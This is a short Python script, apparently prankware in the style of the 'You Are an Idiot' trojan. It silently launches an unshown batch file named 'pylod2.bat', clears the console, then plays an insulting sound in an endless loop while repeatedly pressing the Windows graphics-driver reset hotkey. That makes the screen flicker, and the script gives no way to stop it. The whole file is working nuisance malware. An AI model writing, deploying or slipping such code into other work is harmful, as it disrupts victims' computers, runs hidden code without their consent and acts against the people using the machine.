#coding=ansi
import pyautogui
import pygame
import os
import subprocess

subprocess.Popen('pylod2.bat', shell=True)
os.system ('cls')

def play_audio(file_path):
    pygame.mixer.init()
    pygame.mixer.music.load(file_path)
    pygame.mixer.music.play()

while True:
    play_audio('you-are-an-idiot-sound-effect.wav')
    
    while pygame.mixer.music.get_busy(): 
        pyautogui.hotkey('ctrl', 'shift','win', 'b')
        pygame.time.Clock().tick(10)
